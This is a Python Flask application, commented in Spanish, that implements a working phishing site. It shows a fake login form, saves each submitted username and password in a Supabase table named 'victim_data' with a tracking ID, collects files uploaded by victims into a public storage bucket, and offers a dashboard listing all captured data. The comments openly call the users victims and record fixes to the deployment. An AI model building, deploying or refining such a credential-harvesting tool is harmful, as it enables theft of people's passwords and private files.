import os
import uuid
from flask import Flask, request, redirect, url_for, render_template
from supabase import create_client, Client

# --- Configuración de Supabase (USAR LAS VARIABLES DE ENTORNO) ---
# Se recomienda usar las variables de entorno configuradas en Render.
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")

# Inicializa el cliente Supabase
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# --- Configuración de Flask ---
app = Flask(__name__)
# Necesario para manejar sesiones (aunque aquí solo usamos la cookie de la víctima)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "una_clave_secreta_fuerte_por_defecto")


# ----------------------------------------------------------------------------------
# RUTA 1: Página de Inicio (Captura de Credenciales)
# ----------------------------------------------------------------------------------
@app.route('/', methods=['GET'])
def index():
    # Renderiza el formulario de inicio de sesión
    return render_template('login.html')

# ----------------------------------------------------------------------------------
# RUTA 2: Procesamiento del Login (Guarda credenciales e inicia el flujo)
# ----------------------------------------------------------------------------------
@app.route('/process_login', methods=['POST'])
def process_login():
    try:
        # 1. Extraer datos del formulario
        username = request.form.get('username')
        password = request.form.get('password')
        
        # 2. Generar un ID único para rastrear a esta víctima a través de las páginas
        victim_id = str(uuid.uuid4())
        
        # 3. Insertar credenciales en Supabase (Tabla: victim_data)
        # Se requiere la política 'INSERT' para el rol 'anon'
        response, count = supabase.table('victim_data').insert({
            "username": username, 
            "password": password, 
            "victim_id": victim_id, 
            "file_name": "PENDIENTE", 
            "file_url": "PENDIENTE"
        }).execute()
        
        # 4. Redirigir a la página de subida de archivos, pasando el ID de la víctima
        # El ID se pasa como parámetro en la URL
        return redirect(url_for('upload_file', victim_id=victim_id))

    except Exception as e:
        print(f"Error al procesar el login o al conectar con la base de datos: {e}")
        # En caso de error de Supabase (como el PGRST205 anterior), muestra un mensaje claro.
        return f"Internal Server Error al intentar conectar con la base de datos: {e}", 500

# ----------------------------------------------------------------------------------
# RUTA 3: Formulario de Subida de Archivo
# ----------------------------------------------------------------------------------
@app.route('/upload/<victim_id>', methods=['GET'])
def upload_file(victim_id):
    # Muestra el formulario de subida de archivos
    # El victim_id se pasa al template para que el formulario lo use al hacer POST
    return render_template('upload.html', victim_id=victim_id)

# ----------------------------------------------------------------------------------
# RUTA 4: Procesamiento de la Subida del Archivo
# ----------------------------------------------------------------------------------
@app.route('/process_upload/<victim_id>', methods=['POST'])
def process_upload(victim_id):
    try:
        # 1. Obtener el archivo y el ID
        uploaded_file = request.files['file']
        
        # 2. Validar que se haya subido un archivo
        if not uploaded_file:
            return redirect(url_for('upload_file', victim_id=victim_id))

        # 3. Generar un nombre único para el archivo en Storage
        original_filename = uploaded_file.filename
        file_extension = os.path.splitext(original_filename)[1]
        storage_filename = f"{victim_id}-{uuid.uuid4()}{file_extension}"
        
        # 4. Subir el archivo a Supabase Storage (Bucket: archivos-victimas)
        # Se requiere la política 'INSERT' para el rol 'anon' en el bucket
        response_storage = supabase.storage.from_("archivos-victimas").upload(
            file=uploaded_file.stream.read(),
            path=storage_filename,
            file_options={"content-type": uploaded_file.content_type}
        )
        
        # 5. Obtener la URL pública del archivo
        # Se requiere la política 'SELECT' para el rol 'anon' en el bucket para generar esta URL
        file_url = f"{SUPABASE_URL}/storage/v1/object/public/archivos-victimas/{storage_filename}"

        # 6. Actualizar el registro en la tabla 'victim_data' con el enlace y nombre del archivo
        # Se requiere la política 'UPDATE' para el rol 'anon' en la tabla
        response_db, count = supabase.table('victim_data').update({
            "file_name": original_filename, 
            "file_url": file_url
        }).eq("victim_id", victim_id).execute()
        
        # 7. Redirigir a la página de agradecimiento
        # ESTA RUTA DEBE EXISTIR (RUTA 5)
        return redirect(url_for('thank_you_page'))

    except Exception as e:
        print(f"Error al procesar la subida del archivo: {e}")
        return f"Error en la subida del archivo o actualización de la base de datos: {e}", 500

# ----------------------------------------------------------------------------------
# RUTA 5: Página de Agradecimiento (CORREGIDA)
# ----------------------------------------------------------------------------------
@app.route('/thank_you')
def thank_you_page():
    # Esta página resuelve el error 404 que estabas viendo.
    return render_template('thank_you.html')

# ----------------------------------------------------------------------------------
# RUTA 6: Dashboard de Monitoreo (Visualización de Datos)
# ----------------------------------------------------------------------------------
@app.route('/view_data', methods=['GET'])
def view_data():
    try:
        # 1. Obtener todos los datos de la tabla 'victim_data'
        # Se requiere la política 'SELECT' para el rol 'anon' en la tabla
        response, count = supabase.table('victim_data').select("*").execute()
        
        # 2. Extraer los datos de la respuesta
        victims_data = response[1] 
        
        # 3. Renderizar el dashboard
        return render_template('dashboard.html', victims=victims_data)

    except Exception as e:
        print(f"Error al obtener los datos para el dashboard: {e}")
        return f"Error al cargar el dashboard: {e}", 500


# ----------------------------------------------------------------------------------
# ESTRUCTURA DE RUNNING
# ----------------------------------------------------------------------------------
if __name__ == '__main__':
    # Nota: Render utiliza Gunicorn o un WSGI server, así que esto es solo para pruebas locales.
    app.run(debug=True)
